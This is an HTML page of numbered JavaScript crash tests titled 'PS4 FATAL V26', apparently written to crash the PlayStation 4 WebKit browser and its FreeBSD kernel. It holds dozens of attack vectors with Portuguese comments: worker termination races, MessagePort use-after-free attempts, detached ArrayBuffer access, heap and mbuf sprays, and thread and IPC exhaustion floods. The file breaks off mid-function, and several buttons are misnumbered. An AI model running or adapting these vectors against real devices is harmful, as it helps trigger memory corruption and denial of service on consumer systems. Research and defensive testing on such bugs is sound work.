<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 FATAL V26 (THREAD/IPC/HEAP)</title>
</head>
<body>

<h1>PS4 FATAL VECTORS V26</h1>

<button onclick="runTest157()">157. Worker Stack Amplification Terminate Race</button>
<button onclick="runTest158()">158. MessagePort Entanglement UAF</button>
<button onclick="runTest159()">159. ArrayBuffer Neuter View Access</button>
<button onclick="runTest160()">160. Kthread Scheduler Reaper Race</button>
<button onclick="runTest161()">161. IPC Struct Port Exhaustion Flood</button>
<button onclick="runTest162()">162. VM Page Reclaim Blob Race</button>
<button onclick="runTest163()">163. Nested Worker Lifecycle Race</button>
<button onclick="runTest164()">164. MessagePort Transfer Closure UAF</button>
<button onclick="runTest165()">165. Cross-Context Buffer Detach Access</button>
<button onclick="runTest166()">166. Kqueue File Monitor List Corruption</button>
<button onclick="runTest167()">167. Blocked Thread Scheduler Cleanup Panic</button>
<button onclick="runTest168()">168. VM Object Shadow Chain Exhaustion</button>
<button onclick="runTest169()">169. Recursive Worker Tree Reaper Race</button>
<button onclick="runTest170()">170. Port Entanglement Lifetime Mismatch</button>
<button onclick="runTest171()">171. BackingStore Reclaim Race</button>
<button onclick="runTest172()">172. Kthread Struct Exhaustion</button>
<button onclick="runTest173()">173. IPC Message Queue Deadlock</button>
<button onclick="runTest174()">174. Socket Mbuf Cluster Spray</button>
<button onclick="runTest175()">175. Blob URL Revocation Worker Race</button>
<button onclick="runTest176()">176. MessagePort Transfer-Close Chain</button>
<button onclick="runTest177()">177. ExternalString Resource Free Race</button>
<button onclick="runTest178()">178. Sync XHR Thread Kill Leak</button>
<button onclick="runTest179()">179. Pipe Buffer Read Abort Panic</button>
<button onclick="runTest180()">180. Process Group Signal Race</button>
<button onclick="runTest181()">181. Worker Port Transfer Termination Race</button>
<button onclick="runTest182()">182. Recursive ObjectURL Revocation Loop</button>
<button onclick="runTest183()">183. Detached ArrayBuffer View Access</button>
<button onclick="runTest184()">184. Sync XHR Thread Sleep Signal Panic</button>
<button onclick="runTest185()">185. IPC Port Descriptor Leak Flood</button>
<button onclick="runTest186()">186. Kqueue Vnode Monitor Race Condition</button>
<button onclick="runTest187()">187. Recursive Worker Termination Chain</button>
<button onclick="runTest188()">188. Circular Port Transfer Close Race</button>
<button onclick="runTest189()">189. ArrayBuffer View Detach Re-access</button>
<button onclick="runTest190()">190. Vnode Backing Store Revoke Panic</button>
<button onclick="runTest191()">191. IPC Pipe Buffer Write-Close Race</button>
<button onclick="runTest192()">192. Global File Table Refcount Overflow</button>
<button onclick="runTest193()">193. Nested Worker Termination Stack Race</button>
<button onclick="runTest194()">194. MessagePort Transfer-Close UAF</button>
<button onclick="runTest195()">195. ArrayBuffer Neuter-Clone Trap</button>
<button onclick="runTest196()">196. Blocked Kthread Scheduler Panic</button>
<button onclick="runTest197()">197. IPC Circular Refcount Deadlock</button>
<button onclick="runTest198()">198. VFS Page Reclaim Race Condition</button>
<button onclick="runTest199()">199. Worker GC Mark Stack Overflow Race</button>
<button onclick="runTest200()">200. MessagePort In-Flight Close UAF</button>
<button onclick="runTest201()">201. File Reader Sync Worker Detach</button>
<button onclick="runTest202()">202. Recursive Thread Kill Cascade</button>
<button onclick="runTest203()">203. IPC Port Circular Reference Deadlock</button>
<button onclick="runTest204()">204. Socket Buffer Mbuf Cluster Race</button>
<button onclick="runTest205()">205. Worker Blob Registry GC Race</button>
<button onclick="runTest206()">206. Port Neuter & Transfer Collision</button>
<button onclick="runTest207()">207. TypedArray Constructor Buffer Detach</button>
<button onclick="runTest208()">208. Sync Socket Thread Kill Panic</button>
<button onclick="runTest209()">209. IPC Pipe Creation/Destruction Storm</button>
<button onclick="runTest210()">210. Vnode Slice Overlap Read Race</button>
<button onclick="runTest211()">211. Recursive Worker Fork Bomb Race</button>
<button onclick="runTest212()">212. Entangled Port Transfer Close Race</button>
<button onclick="runTest213()">213. TypedArray Neuter Heap Reclaim</button>
<button onclick="runTest214()">214. Sync XHR Blocked Thread Kill</button>
<button onclick="runTest215()">215. IPC Pending Queue Destruction Panic</button>
<button onclick="runTest216()">216. Vnode Backing Store Revoke Collision</button>
<button onclick="runTest217()">217. Worker Message Bomb GC Trigger</button>
<button onclick="runTest218()">218. Port Transfer Buffer Detach Race</button>
<button onclick="runTest219()">219. Blob URL XHR Concurrent Revoke</button>
<button onclick="runTest220()">220. Blocked Sync Socket Thread Termination</button>
<button onclick="runTest221()">221. Entangled IPC Channel Chain Destruction</button>
<button onclick="runTest222()">222. Fragmented Mbuf Cluster Spray</button>
<button onclick="runTest223()">223. Worker Recursion Stack Unwind Race</button>
<button onclick="runTest224()">224. MessageChannel Transfer Close Loop</button>
<button onclick="runTest225()">225. Object Graph Serialization GC Trap</button>
<button onclick="runTest226()">226. Sync Socket Blocked Thread Kill</button>
<button onclick="runTest227()">227. IPC Port Graph Reference Overflow</button>
<button onclick="runTest228()">228. Vnode Slice Concurrent Read/Revoke</button>
<button onclick="runTest229()">229. Recursive Proxy Object Clone Race</button>
<button onclick="runTest230()">230. MessagePort Detached Buffer Access</button>
<button onclick="runTest231()">231. Blob URL Revoke ImportScripts Race</button>
<button onclick="runTest232()">232. Sync XHR Mass Thread Termination</button>
<button onclick="runTest233()">233. IPC Circular Port Chain Deadlock</button>
<button onclick="runTest234()">234. Fetch Stream Abort Mbuf Leak</button>
<button onclick="runTest235()">235. Deep Nested Object GC Worker Race</button>
<button onclick="runTest236()">236. Property Getter Port Close Trap</button>
<button onclick="runTest237()">237. ArrayBuffer Transfer Zombie Access</button>
<button onclick="runTest238()">238. Sync XHR Blocked Kthread Kill Storm</button>
<button onclick="runTest239()">239. IPC Entangled Port Chain Reclaim</button>
<button onclick="runTest240()">240. Socket Mbuf Write Abort Flood</button>
<button onclick="runTest241()">241. Blob Revocation Orphan Worker Race</button>
<button onclick="runTest242()">242. Recursive Port Transfer Self-Reference</button>
<button onclick="runTest243()">243. Detached Buffer View Stale Pointer</button>
<button onclick="runTest244()">244. Sync Socket Blocked Thread Zombie</button>
<button onclick="runTest245()">245. IPC Port Descriptor Fragmentation</button>
<button onclick="runTest246()">246. Mbuf Cluster Abort Leak Storm</button>
<button onclick="runTest247()">247. Recursive Worker IPC Bounce Race</button>
<button onclick="runTest248()">248. Detached ArrayBuffer View Trap Access</button>
<button onclick="runTest249()">249. Blob URL Circular Reference GC Storm</button>
<button onclick="runTest250()">250. Sync XHR Blocked Thread Mass Kill</button>
<button onclick="runTest251()">251. Nested MessagePort Chain Deep Free</button>
<button onclick="runTest252()">252. Fetch Stream KeepAlive Mbuf Leak</button>
<button onclick="runTest253()">253. Nested Worker Object Graph GC Race</button>
<button onclick="runTest254()">254. Circular Port Transfer Lifetime Trap</button>
<button onclick="runTest255()">255. Buffer Neuter Proxy Getter Access</button>
<button onclick="runTest256()">256. Sync XHR Sleep Queue Thread Kill</button>
<button onclick="runTest257()">257. IPC Port Descriptor Chain Exhaustion</button>
<button onclick="runTest258()">258. Fetch KeepAlive Mbuf Cluster Leak</button>
<button onclick="runTest259()">259. Deep Graph Transfer Termination Race</button>
<button onclick="runTest260()">260. Port Masquerading Close UAF</button>
<button onclick="runTest261()">261. Blob Slice Overlap Revoke Trap</button>
<button onclick="runTest262()">262. Sync XHR SleepQueue Thread Panic</button>
<button onclick="runTest263()">263. IPC Port Chain Fragmentation Deadlock</button>
<button onclick="runTest264()">264. Fetch Stream Abort Mbuf Cluster Race</button>
<button onclick="runTest265()">265. Recursive Worker Cascade Termination</button>
<button onclick="runTest266()">266. IPC Channel Flux Refcount Stress</button>
<button onclick="runTest267()">267. ArrayBuffer Neuter Access Race</button>
<button onclick="runTest268()">268. Sync Socket Blocked Thread Kill</button>
<button onclick="runTest269()">269. Circular IPC Port Chain Deadlock</button>
<button onclick="runTest270()">270. Socket Write Mbuf Cluster Abort</button>
<button onclick="runTest270()">271. Recursive Graph Worker GC Trap</button>
<button onclick="runTest271()">272. Port Entanglement Close Race</button>
<button onclick="runTest272()">273. Stale Buffer View Neuter Loop</button>
<button onclick="runTest273()">274. Sync XHR Thread Scheduler Chaos</button>
<button onclick="runTest274()">275. IPC Ring Circular Dependency Panic</button>
<button onclick="runTest275()">276. Socket Mbuf Cluster Fragment Storm</button>
<button onclick="runTest277()">277. Recursive Worker Object Graph GC Race</button>
<button onclick="runTest278()">278. Intertwined Port Chain Closure UAF</button>
<button onclick="runTest279()">279. Proxy Trap Buffer Neuter Race</button>
<button onclick="runTest280()">280. Sync Socket Blocked Thread Mass Kill</button>
<button onclick="runTest281()">281. IPC Circular Topology Refcount Overflow</button>
<button onclick="runTest282()">282. Fetch KeepAlive Mbuf Cluster Race</button>
<button onclick="runTest283()">283. Recursive Worker Blob Transfer Trap</button>
<button onclick="runTest284()">284. Nested Port Masquerading Race</button>
<button onclick="runTest285()">285. Proxy Get Trap Buffer Neuter</button>
<button onclick="runTest286()">286. Sync XHR Sleep Queue Thread Storm</button>
<button onclick="runTest287()">287. IPC Braided Chain Refcount Overflow</button>
<button onclick="runTest288()">288. Fetch Stream KeepAlive Mbuf Fragment</button>


<div id="log">Logs:</div>

<script>
function log(msg) {
    var d = document.createElement("div");
    d.innerText = "> " + msg;
    document.getElementById("log").appendChild(d);
}

// 157. Worker Stack Amplification Terminate Race (WebKit Crash)
// Vetor: Thread lifecycle amplification.
// Lógica: Cria um Worker que entra em recursão profunda (estouro de pilha/stack).
// A thread principal termina o worker no meio da alocação de stack frames.
// Visa corromper o cleanup da stack da thread do worker.
function runTest157() {
    log("157. Stack Race...");
    var code = `
        function recurse(n) {
            var arr = new Float64Array(100);
            if(n<=0) return arr;
            return recurse(n-1);
        }
        onmessage = function() { recurse(50000); }
    `;
    var blob = new Blob([code], {type: 'text/javascript'});
    var url = URL.createObjectURL(blob);
    
    var workers = [];
    var i = setInterval(function() {
        var w = new Worker(url);
        workers.push(w);
        w.postMessage("start");
        
        // Race condition: Terminar enquanto a stack cresce
        if(Math.random() > 0.5) {
            w.terminate();
            // Tenta forçar reclaim imediato
            w = null;
        }
        
        if(workers.length > 50) {
            var dead = workers.shift();
            if(dead) dead.terminate();
        }
    }, 5);
    
    setTimeout(function(){ clearInterval(i); log("Cycle 157 End"); }, 4000);
}

// 158. MessagePort Entanglement UAF (WebKit Crash)
// Vetor: IPC / Message Port churn.
// Lógica: Cria canais emaranhados e transfere portas fechadas ou em processo de fechamento.
// Tenta causar inconsistência de ownership na estrutura subjacente do WebKit MessagePort.
function runTest158() {
    log("158. Port UAF...");
    var channel1 = new MessageChannel();
    var channel2 = new MessageChannel();
    var port1 = channel1.port1;
    var port2 = channel1.port2;
    var port3 = channel2.port1;
    
    port1.onmessage = function(e) { 
        // Recebe porta e tenta usar
        try { e.data.postMessage("ping"); } catch(z){} 
    };
    
    try {
        // Envia port3 através de port2, depois fecha port3 e port2
        // O WebKit precisa serializar a porta, mas ela morre no meio
        port2.postMessage(port3, [port3]);
        port3.close();
        port2.close();
        
        // Aloca lixo para preencher memória da porta liberada
        var junk = [];
        for(var i=0; i<1000; i++) junk.push({a:1});
        
        port1.start();
        log("158: Ports closed/transferred");
    } catch(e) { log("Fail: " + e); }
}

// 159. ArrayBuffer Neuter View Access (WebKit Crash)
// Vetor: Cross-context lifetime mismatch.
// Lógica: Cria uma DataView sobre um buffer. Transfere o buffer (neutering).
// Tenta ler a view imediatamente. O JIT (se houvesse) otimizaria, mas no interpretador
// forçamos o acesso a um ponteiro "stale" do backing store.
function runTest159() {
    log("159. Neuter View...");
    var buf = new ArrayBuffer(1024 * 1024);
    var view = new DataView(buf);
    
    // Worker para receber o buffer
    var w = new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){}'],{type:'text/javascript'})));
    
    try {
        // Define valor
        view.setInt32(0, 0x12345678);
        
        // Transfere ownership (zera o buffer na main thread)
        w.postMessage(buf, [buf]);
        
        // Acesso ilegal imediato
        // O objeto view ainda existe, mas o ponteiro interno m_data foi limpo ou é inválido
        var val = view.getInt32(0);
        log("159: Read value (Should fail/crash): " + val);
    } catch(e) {
        log("159: Safe trap: " + e.name);
    }
}

// 160. Kthread Scheduler Reaper Race (Kernel Panic)
// Vetor: Impacto no kernel (criação de kthread / scheduler).
// Lógica: Spawn/Kill massivo. O Kernel do FreeBSD tem uma thread "reaper" para limpar processos zumbis.
// Se criarmos threads mais rápido do que o reaper limpa, esgotamos a `struct proc` ou causamos panic no scheduler.
function runTest160() {
    log("160. Kthread Reaper...");
    var url = URL.createObjectURL(new Blob(['while(1);'], {type:'text/javascript'}));
    var pool = [];
    
    var i = setInterval(function() {
        // Burst de criação
        for(var k=0; k<10; k++) {
            var w = new Worker(url);
            pool.push(w);
        }
        
        // Burst de destruição imediata
        while(pool.length > 0) {
            var w = pool.pop();
            w.terminate(); // Sinaliza SIGKILL
        }
        
        // O kernel precisa remover essas threads da fila do scheduler
        // e liberar a stack do kernel associada.
    }, 10);
    
    setTimeout(function(){ clearInterval(i); log("160: Reaper stress end"); }, 5000);
}

// 161. IPC Struct Port Exhaustion Flood (Kernel Panic)
// Vetor: Impacto no kernel (alocação de estruturas IPC / locks finos).
// Lógica: Cria milhares de MessageChannels e envia objetos grandes.
// Isso consome `struct ipc_port` (ou equivalente mach/bsd) e estressa os locks de fila de mensagens.
function runTest161() {
    log("161. IPC Struct Flood...");
    var channels = [];
    var msg = new Uint8Array(4096).fill(0xCC); // 4KB msg
    
    var i = setInterval(function() {
        try {
            var mc = new MessageChannel();
            // Enche o buffer do kernel para este par de portas
            for(var k=0; k<50; k++) {
                mc.port1.postMessage(msg);
            }
            channels.push(mc);
            
            // Randomly close some to fragment the IPC space
            if(Math.random() > 0.8) {
                var victim = channels.shift();
                victim.port1.close();
                victim.port2.close();
            }
        } catch(e) {
            log("161: IPC Limit hit: " + e);
            clearInterval(i);
        }
    }, 5);
    
    setTimeout(function(){ clearInterval(i); log("161: End"); }, 5000);
}

// 162. VM Page Reclaim Blob Race (Kernel Panic)
// Vetor: Alocação massiva + timing (reaproveitamento de páginas).
// Lógica: Cria Blobs grandes, inicia leitura (XHR), revoga URL e anula referência.
// O Kernel tenta ler a página de memória para o XHR enquanto o VM system tenta reclamar a página liberada.
function runTest162() {
    log("162. VM Page Race...");
    var data = new Uint8Array(1024 * 1024 * 2); // 2MB Pages
    var reqs = [];
    
    var i = setInterval(function() {
        var blob = new Blob([data]);
        var url = URL.createObjectURL(blob);
        
        var xhr = new XMLHttpRequest();
        xhr.open("GET", url, true);
        xhr.send();
        reqs.push(xhr);
        
        // Critical Timing: Revoga e anula imediatamente
        URL.revokeObjectURL(url);
        blob = null;
        
        // Aborta XHRs antigos para forçar cleanup de sockets
        if(reqs.length > 20) {
            reqs.shift().abort();
        }
        
        // Alocação concorrente para forçar reuso de slab/page
        var pressure = new ArrayBuffer(1024 * 1024);
    }, 10);
    
    setTimeout(function(){ clearInterval(i); log("162: VM Race end"); }, 5000);
}
function runTest163() {
    log("163. Thread Lifecycle...");
    var code = `
        self.onmessage = function(e) {
            if (e.data > 0) {
                try {
                    var w = new Worker(self.location.href);
                    w.postMessage(e.data - 1);
                    var arr = new Float64Array(10000); 
                    for(var i=0; i<1000; i++) arr[i] = Math.random();
                } catch(err) {}
            }
        };
    `;
    var blob = new Blob([code], {type: 'text/javascript'});
    var url = URL.createObjectURL(blob);
    var rootWorkers = [];
    var t = setInterval(function() {
        var w = new Worker(url);
        rootWorkers.push(w);
        w.postMessage(5); 
        if (rootWorkers.length > 20) {
            var victim = rootWorkers.shift();
            victim.terminate(); 
            victim = null;
        }
    }, 10);
    setTimeout(function() {
        clearInterval(t);
        rootWorkers.forEach(function(w){ w.terminate(); });
        URL.revokeObjectURL(url);
        log("163: Cycle complete");
    }, 4000);
}

function runTest164() {
    log("164. IPC Port Churn...");
    var channel = new MessageChannel();
    var port1 = channel.port1;
    var port2 = channel.port2;
    var transferArray = [];
    
    for(var i=0; i<100; i++) {
        var ab = new ArrayBuffer(1024);
        transferArray.push(ab);
    }
    
    port1.onmessage = function(e) {
        log("Msg: " + e.data.byteLength);
    };
    
    var iter = 0;
    var interval = setInterval(function() {
        try {
            var subChannel = new MessageChannel();
            var payload = transferArray[iter % transferArray.length];
            
            port2.postMessage(payload, [payload]);
            subChannel.port1.postMessage("ping");
            
            port2.close(); 
            subChannel.port2.close();
            
            if (payload.byteLength !== 0) {
                 log("Fail: Buffer not neutered");
            }
            
            channel = new MessageChannel();
            port1 = channel.port1;
            port2 = channel.port2;
            iter++;
        } catch(e) {
            log("164 Err: " + e.message);
        }
    }, 5);
    setTimeout(function(){ clearInterval(interval); log("164: Done"); }, 3000);
}

function runTest165() {
    log("165. Lifetime Mismatch...");
    var buffer = new ArrayBuffer(1024 * 1024);
    var view = new Uint8Array(buffer);
    view[0] = 1;
    
    var w = new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){ postMessage("ack"); }'], {type:'text/javascript'})));
    
    w.onmessage = function() {
        try {
            var val = view[0]; 
            log("Read after transfer attempt: " + val);
        } catch(e) {
            log("Trapped access: " + e.message);
        }
    };
    
    setTimeout(function() {
        try {
            w.postMessage(buffer, [buffer]); 
            if (buffer.byteLength === 0) {
                try {
                    var crash = view[0]; 
                } catch(e) { log("View detached correctly"); }
            }
            w.terminate();
        } catch(e) { log(e); }
    }, 100);
}

function runTest166() {
    log("166. Kqueue List Race...");
    var blob = new Blob(["A".repeat(1024)]);
    var readers = [];
    var running = true;
    
    function cycle() {
        if (!running) return;
        for(var i=0; i<50; i++) {
            var fr = new FileReader();
            fr.readAsText(blob);
            readers.push(fr);
        }
        
        while(readers.length > 0) {
            var r = readers.pop();
            r.abort(); 
        }
        
        var junk = new ArrayBuffer(1024 * 1024);
        setTimeout(cycle, 10);
    }
    
    cycle();
    setTimeout(function() { running = false; log("166: Kqueue stress end"); }, 4000);
}

function runTest167() {
    log("167. Scheduler Cleanup...");
    var code = `
        onmessage = function() {
            var xhr = new XMLHttpRequest();
            xhr.open("GET", "/dummy_block", false); 
            try { xhr.send(); } catch(e){}
        };
    `;
    var url = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
    var workers = [];
    
    var t = setInterval(function() {
        var w = new Worker(url);
        w.postMessage("block");
        workers.push(w);
        
        if (workers.length > 30) {
            var dead = workers.shift();
            dead.terminate(); 
        }
    }, 20);
    
    setTimeout(function() {
        clearInterval(t);
        workers.forEach(w => w.terminate());
        log("167: Thread cleanup test end");
    }, 5000);
}

function runTest168() {
    log("168. VM Shadow Chain...");
    var roots = [];
    try {
        var base = new Blob([new Uint8Array(4096)]);
        var current = base;
        
        for(var i=0; i<1000; i++) {
            var slice = current.slice(0, 2048);
            current = new Blob([slice, slice]); 
            if (i % 100 === 0) roots.push(current);
        }
        
        var fr = new FileReader();
        fr.readAsArrayBuffer(current);
        
        setTimeout(function() {
            roots = []; 
            current = null;
            var pressure = new Uint8Array(1024*1024*10); 
        }, 10);
        
        log("168: Chain built");
    } catch(e) {
        log("168 Fail: " + e);
    }
}
function runTest169() {
    log("169. Worker Tree Race...");
    var code = `
        self.onmessage = function(e) {
            if(e.data > 0) {
                try {
                    var w = new Worker(self.location.href);
                    w.postMessage(e.data - 1);
                    var f = new Float64Array(1024);
                } catch(z){}
            }
        };
    `;
    var blob = new Blob([code], {type: 'text/javascript'});
    var url = URL.createObjectURL(blob);
    var roots = [];
    var i = setInterval(function() {
        var w = new Worker(url);
        roots.push(w);
        w.postMessage(10); 
        if(roots.length > 15) {
            var v = roots.shift();
            v.terminate();
            v = null;
        }
    }, 15);
    setTimeout(function(){ clearInterval(i); roots.forEach(w=>w.terminate()); log("169: Done"); }, 4000);
}

function runTest170() {
    log("170. Port Lifetime...");
    var mc = new MessageChannel();
    var p1 = mc.port1;
    var p2 = mc.port2;
    var w = new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){e.data.close();}'],{type:'text/javascript'})));
    var i = setInterval(function() {
        try {
            var sub = new MessageChannel();
            p1.postMessage(sub.port1, [sub.port1]);
            w.postMessage(sub.port2, [sub.port2]);
            p2.onmessage = function(e) { e.data.postMessage("ping"); };
            if(Math.random() > 0.5) {
                p1.close();
                mc = new MessageChannel();
                p1 = mc.port1; p2 = mc.port2;
            }
        } catch(e) { log("170 Err: " + e.message); }
    }, 5);
    setTimeout(function(){ clearInterval(i); w.terminate(); log("170: Done"); }, 4000);
}

function runTest171() {
    log("171. Store Reclaim...");
    var w = new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){postMessage("ack");}'],{type:'text/javascript'})));
    var arr = [];
    var i = setInterval(function() {
        var buf = new ArrayBuffer(1024 * 1024);
        var view = new Uint8Array(buf);
        view[0] = 0xFF;
        try {
            w.postMessage(buf, [buf]);
            if(buf.byteLength === 0) {
                w.terminate();
                w = new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){postMessage("ack");}'],{type:'text/javascript'})));
                var reclaim = new ArrayBuffer(1024 * 1024);
                var rView = new Uint8Array(reclaim);
                rView[0] = 0xAA;
            }
        } catch(e) {}
    }, 10);
    setTimeout(function(){ clearInterval(i); w.terminate(); log("171: Done"); }, 4000);
}

function runTest172() {
    log("172. Kthread Exhaust...");
    var code = `while(true){}`; 
    var url = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
    var pool = [];
    var i = setInterval(function() {
        for(var k=0; k<5; k++) {
            var w = new Worker(url);
            pool.push(w);
        }
        while(pool.length > 20) {
            var old = pool.shift();
            old.terminate(); 
        }
    }, 10);
    setTimeout(function(){ clearInterval(i); pool.forEach(p=>p.terminate()); log("172: Done"); }, 5000);
}

function runTest173() {
    log("173. IPC Deadlock...");
    var mc = new MessageChannel();
    var p1 = mc.port1;
    var p2 = mc.port2; 
    var payload = new Uint8Array(1024 * 64); 
    var i = setInterval(function() {
        try {
            for(var k=0; k<50; k++) {
                p1.postMessage(payload);
            }
            // Não lemos p2, forçando a fila do kernel a encher
            // Tentamos fechar p2 com mensagens pendentes
            if(Math.random() > 0.9) {
                var temp = new MessageChannel();
                p1 = temp.port1;
                p2.close(); 
                p2 = temp.port2;
            }
        } catch(e) { log("173 Err: " + e.message); }
    }, 5);
    setTimeout(function(){ clearInterval(i); log("173: Done"); }, 5000);
}

function runTest174() {
    log("174. Mbuf Spray...");
    var chunk = new Uint8Array(4096).fill(0xCC);
    var blob = new Blob([chunk]);
    var reqs = [];
    var i = setInterval(function() {
        try {
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "/mbuf_spray_" + Math.random(), true);
            xhr.send(blob);
            reqs.push(xhr);
            if(reqs.length > 50) {
                var batch = reqs.splice(0, 25);
                batch.forEach(function(x){ x.abort(); });
            }
        } catch(e){}
    }, 5);
    setTimeout(function(){ clearInterval(i); log("174: Done"); }, 5000);
}
function runTest175() {
    log("175. Blob Revoke Race...");
    var code = `self.onmessage=function(e){postMessage(e.data);}`;
    var pool = [];
    var i = setInterval(function() {
        var b = new Blob([code], {type:'text/javascript'});
        var u = URL.createObjectURL(b);
        var w = new Worker(u);
        w.postMessage("ping");
        pool.push(w);
        if(pool.length > 10) {
            var v = pool.shift();
            v.terminate();
            URL.revokeObjectURL(u);
            try { v.postMessage("dead"); } catch(e){}
        }
    }, 10);
    setTimeout(function(){ clearInterval(i); pool.forEach(k=>k.terminate()); log("175: Done"); }, 4000);
}

function runTest176() {
    log("176. Port Chain...");
    var channel = new MessageChannel();
    var port = channel.port1;
    var i = setInterval(function() {
        try {
            var next = new MessageChannel();
            port.postMessage(next.port1, [next.port1]);
            port = next.port2;
            var payload = new Uint8Array(1024);
            port.postMessage(payload);
            if(Math.random() > 0.7) {
                port.close(); 
                channel = new MessageChannel();
                port = channel.port1;
            }
        } catch(e){ log("176 Err: " + e.message); }
    }, 5);
    setTimeout(function(){ clearInterval(i); log("176: Done"); }, 4000);
}

function runTest177() {
    log("177. String Free Race...");
    var w = new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){postMessage(e.data.length);}'],{type:'text/javascript'})));
    var i = setInterval(function() {
        var huge = "S".repeat(1024 * 1024 * 5);
        w.postMessage(huge);
        huge = null; 
        var press = new ArrayBuffer(1024 * 1024 * 10); 
    }, 50);
    setTimeout(function(){ clearInterval(i); w.terminate(); log("177: Done"); }, 4000);
}

function runTest178() {
    log("178. Sync XHR Kill...");
    var code = `
        onmessage = function() {
            try {
                var x = new XMLHttpRequest();
                x.open("GET", "http://127.0.0.1:54321", false);
                x.send();
            } catch(e){}
        }
    `;
    var u = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
    var workers = [];
    var t = setInterval(function() {
        var w = new Worker(u);
        workers.push(w);
        w.postMessage("start");
        if(workers.length > 40) {
            var d = workers.shift();
            d.terminate(); 
        }
    }, 20);
    setTimeout(function(){ clearInterval(t); workers.forEach(w=>w.terminate()); log("178: Done"); }, 5000);
}

function runTest179() {
    log("179. Pipe Abort...");
    var b = new Blob([new Uint8Array(1024*1024*2)]);
    var readers = [];
    var t = setInterval(function() {
        for(var k=0; k<10; k++) {
            var fr = new FileReader();
            fr.readAsArrayBuffer(b.slice(k*100, (k*100)+4096));
            readers.push(fr);
        }
        while(readers.length > 5) {
            var r = readers.pop();
            r.abort(); 
        }
    }, 10);
    setTimeout(function(){ clearInterval(t); log("179: Done"); }, 4000);
}

function runTest180() {
    log("180. Proc Group Race...");
    var code = `
        var child = null;
        try { child = new Worker(self.location.href); } catch(e){}
        self.onmessage = function() { if(child) child.terminate(); }
    `;
    var u = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
    var roots = [];
    var t = setInterval(function() {
        var w = new Worker(u);
        roots.push(w);
        if(roots.length > 15) {
            var old = roots.shift();
            old.terminate(); 
        }
    }, 30);
    setTimeout(function(){ clearInterval(t); roots.forEach(w=>w.terminate()); log("180: Done"); }, 5000);
}
function runTest181() {
    log("181. Worker Port Race...");
    var code = `
        self.onmessage = function(e) {
            var p = e.data;
            p.postMessage("ping");
            // Tenta fechar a porta enquanto o kernel a enfileira
            p.close();
        };
    `;
    var u = URL.createObjectURL(new Blob([code], {type: 'text/javascript'}));
    var workers = [];
    var i = setInterval(function() {
        var w = new Worker(u);
        var mc = new MessageChannel();
        // Transfere a porta e mata o worker imediatamente
        // O kernel tem que lidar com a entrega da mensagem para uma thread morta
        w.postMessage(mc.port2, [mc.port2]);
        workers.push(w);
        if(Math.random() > 0.5) w.terminate();
        
        if(workers.length > 20) {
            var old = workers.shift();
            old.terminate();
        }
    }, 10);
    setTimeout(function(){ clearInterval(i); log("181: Done"); }, 4000);
}

function runTest182() {
    log("182. URL Revoke Loop...");
    var blobs = [];
    var urls = [];
    // Cria cadeia de dependência
    for(var k=0; k<50; k++) blobs.push(new Blob([new Uint8Array(1024)]));
    
    var i = setInterval(function() {
        // Criação e destruição rápida de referências VFS
        for(var j=0; j<10; j++) {
            var u = URL.createObjectURL(blobs[j % blobs.length]);
            urls.push(u);
        }
        // Tenta ler enquanto revoga
        var target = urls.shift();
        var xhr = new XMLHttpRequest();
        xhr.open("GET", target, true);
        xhr.send();
        URL.revokeObjectURL(target);
        
        if(urls.length > 100) urls = [];
    }, 5);
    setTimeout(function(){ clearInterval(i); log("182: Done"); }, 4000);
}

function runTest183() {
    log("183. Detached View...");
    var buf = new ArrayBuffer(1024 * 1024);
    var view = new Uint32Array(buf);
    view[0] = 0xDEADBEEF;
    
    var w = new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){postMessage("ack");}'],{type:'text/javascript'})));
    
    // Transfere buffer (neutering)
    w.postMessage(buf, [buf]);
    
    try {
        // Acesso após transferência
        // Em WebKit antigo, a view pode manter um ponteiro sujo para o backing store liberado
        var val = view[0];
        log("183 Fail: Read " + val); 
    } catch(e) {
        // Verifica se a exceção é a correta, se não, pode ter corrompido estado
        if(!e.message.includes("detached")) log("183 Suspicious: " + e.message);
    }
    w.terminate();
    log("183: Done");
}

function runTest184() {
    log("184. Sync XHR Kill...");
    // Vetor crítico para FreeBSD: Matar thread em estado de sono (cv_wait/msleep)
    var code = `
        self.onmessage = function() {
            var x = new XMLHttpRequest();
            // Conecta a porta fechada para forçar wait no kernel socket connect
            x.open("GET", "http://127.0.0.1:9999", false);
            try { x.send(); } catch(e){}
        };
    `;
    var u = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
    var pool = [];
    
    var i = setInterval(function() {
        var w = new Worker(u);
        w.postMessage("run");
        pool.push(w);
        
        // Janela crítica: O worker entra na syscall 'connect' ou 'send'
        // Enviamos SIGKILL (terminate) para forçar o kernel a desenrolar a stack da thread
        if(pool.length > 15) {
            var d = pool.shift();
            d.terminate();
        }
    }, 15);
    setTimeout(function(){ clearInterval(i); pool.forEach(w=>w.terminate()); log("184: Done"); }, 5000);
}

function runTest185() {
    log("185. IPC Port Flood...");
    var w = new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){}'],{type:'text/javascript'})));
    var ports = [];
    
    // Aloca milhares de portas IPC no kernel
    for(var k=0; k<1000; k++) {
        var mc = new MessageChannel();
        ports.push(mc.port2);
    }
    
    var i = setInterval(function() {
        // Transfere portas em massa para o worker
        // O kernel move a ownership da estrutura IPC para a task do worker
        var batch = ports.splice(0, 50);
        if(batch.length > 0) {
            w.postMessage("ports", batch);
        } else {
            // Mata o worker segurando milhares de portas abertas
            // O cleanup do kernel deve fechar todas recursivamente
            w.terminate();
            clearInterval(i);
            log("185: Mass close triggered");
        }
    }, 10);
}

function runTest186() {
    log("186. Kqueue Race...");
    var b = new Blob(["test"]);
    var readers = [];
    var running = true;
    
    // Cria e aborta FileReaders rapidamente
    // FileReader usa kqueue/kevent para monitorar o descritor de arquivo
    function loop() {
        if(!running) return;
        for(var k=0; k<20; k++) {
            var fr = new FileReader();
            fr.readAsText(b);
            readers.push(fr);
        }
